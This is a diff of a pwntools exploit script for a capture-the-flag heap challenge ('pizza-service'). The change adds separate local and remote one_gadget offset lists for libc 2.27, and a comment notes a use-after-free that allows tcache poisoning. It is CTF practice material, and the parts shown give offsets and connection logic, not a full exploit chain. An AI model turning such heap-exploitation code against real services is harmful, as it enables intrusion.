@@ -4,18 +4,20 @@ from pwn import *
 elf = ELF("./challenge/pizza-service")
 remote_libc = ELF("./lib/libc-2.27.so")
 
+one_gadgets_local = [0x4f3d5, 0x4f432, 0x10a41c]
+one_gadgets_remote = [0x4f2c5, 0x4f322, 0x10a38c]
+
 HOST, PORT = "localhost", 1337
 
 context.binary = elf
 context.terminal = ["tmux", "splitw", "-h", "-p", "75"]
 
 def main():
-    global io, libc
+    global io, libc, one_gadgets
     pad = 0x10
-    one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]
-    one_gadget = one_gadgets[1]
 
     io = conn()
+    one_gadget = one_gadgets[1]
 
     # vulnerabilties :
     # - orders can still be edited after being delivered (freed) => tcache poisoning
@@ -152,14 +154,16 @@ def relogin(name):
     io.sendlineafter("characters max) : ", name)
 
 def conn():
-    global libc
+    global libc, one_gadgets
     gdbscript = '''
     '''
     if args.REMOTE:
         libc = remote_libc
+        one_gadgets = one_gadgets_remote
         return remote(HOST, PORT)
     else:
         libc = elf.libc
+        one_gadgets = one_gadgets_local
         p = process([elf.path])
         if args.GDB:
             gdb.attach(p, gdbscript=gdbscript)
